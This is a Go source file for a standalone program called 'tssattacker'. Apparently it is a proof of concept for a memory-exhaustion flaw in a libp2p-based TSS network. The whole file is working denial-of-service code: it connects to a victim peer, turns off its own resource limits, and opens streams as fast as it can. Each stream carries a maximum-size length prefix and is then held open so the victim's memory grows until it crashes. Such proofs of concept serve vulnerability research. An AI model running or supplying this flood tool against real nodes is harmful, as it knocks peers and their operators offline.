// tssattacker is a standalone external-attacker simulator. It knows nothing
// about the victim except its public libp2p peer ID + multiaddrs + protocol
// ID (exactly what any internet peer could learn from on-chain
// NetworkInfo.MultiAddrs, as this same codebase's Coordinator does). It opens
// as many concurrent streams as it can, on each writing a valid MaxFrameSize
// length prefix and then nothing else, holding the connection open -- the
// exact primitive proven against the real Network in flood_poc_test.go, now
// run against a REAL SEPARATE OS PROCESS with a hard memory ceiling to prove
// an actual crash, not just heap growth inside a shared test binary.
package main

import (
	"context"
	"encoding/binary"
	"fmt"
	"os"
	"strconv"
	"sync/atomic"
	"time"

	libp2p "github.com/libp2p/go-libp2p"
	"github.com/libp2p/go-libp2p/core/network"
	"github.com/libp2p/go-libp2p/core/peer"
	"github.com/libp2p/go-libp2p/core/protocol"
	"github.com/multiformats/go-multiaddr"
)

const maxFrameSize = 1 * 1024 * 1024 // matches libp2p.MaxFrameSize in network.go

func main() {
	if len(os.Args) < 5 {
		fmt.Fprintln(os.Stderr, "usage: tssattacker <peerID> <protocolID> <durationSeconds> <addr...>")
		os.Exit(1)
	}
	victimPeerIDStr := os.Args[1]
	protocolID := os.Args[2]
	durationSec, _ := strconv.Atoi(os.Args[3])
	addrStrs := os.Args[4:]

	victimPeerID, err := peer.Decode(victimPeerIDStr)
	if err != nil {
		fmt.Fprintf(os.Stderr, "bad peer id: %v\n", err)
		os.Exit(1)
	}

	var addrs []multiaddr.Multiaddr
	for _, s := range addrStrs {
		a, err := multiaddr.NewMultiaddr(s)
		if err != nil {
			continue
		}
		addrs = append(addrs, a)
	}
	if len(addrs) == 0 {
		fmt.Fprintln(os.Stderr, "no usable victim addresses")
		os.Exit(1)
	}

	// A real attacker controls their own process and disables their own
	// self-throttling resource manager -- see flood_poc_test.go for the
	// controlled comparison showing this is what actually matters.
	host, err := libp2p.New(
		libp2p.ListenAddrStrings("/ip4/127.0.0.1/tcp/0"),
		libp2p.ResourceManager(&network.NullResourceManager{}),
	)
	if err != nil {
		fmt.Fprintf(os.Stderr, "failed to create attacker host: %v\n", err)
		os.Exit(1)
	}
	defer host.Close()

	victimInfo := peer.AddrInfo{ID: victimPeerID, Addrs: addrs}
	if err := host.Connect(context.Background(), victimInfo); err != nil {
		fmt.Fprintf(os.Stderr, "failed to connect to victim: %v\n", err)
		os.Exit(1)
	}
	fmt.Println("ATTACKER CONNECTED, flooding...")

	var opened int64
	var failed int64
	deadline := time.Now().Add(time.Duration(durationSec) * time.Second)

	// Fire streams continuously and as fast as possible -- no stagger, no
	// self-imposed wave pacing. Each stream is held open (never closed by us)
	// so the victim keeps its buffer/goroutine alive for the full IOTimeout,
	// and we keep opening new ones faster than old ones can expire.
	for time.Now().Before(deadline) {
		go func() {
			streamCtx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
			defer cancel()
			stream, err := host.NewStream(streamCtx, victimPeerID, protocol.ID(protocolID))
			if err != nil {
				atomic.AddInt64(&failed, 1)
				return
			}
			atomic.AddInt64(&opened, 1)
			lenBuf := make([]byte, 4)
			binary.BigEndian.PutUint32(lenBuf, uint32(maxFrameSize))
			_, _ = stream.Write(lenBuf)
			// Never close, never send more -- hold indefinitely within our
			// own process lifetime; the victim's own IOTimeout will fire on
			// its side, but if we outrun that rate the victim's concurrent
			// live set keeps growing.
			time.Sleep(60 * time.Second)
			stream.Close()
		}()
		// Minimal pacing to avoid the attacker's own local fd/goroutine churn
		// dominating; still far faster than the victim can drain.
		time.Sleep(200 * time.Microsecond)
	}

	fmt.Printf("FLOOD DONE opened=%d failed=%d\n", atomic.LoadInt64(&opened), atomic.LoadInt64(&failed))
	// Keep the attacker process (and its open streams) alive a bit longer so
	// the already-opened streams keep pressuring the victim during observation.
	time.Sleep(20 * time.Second)
}
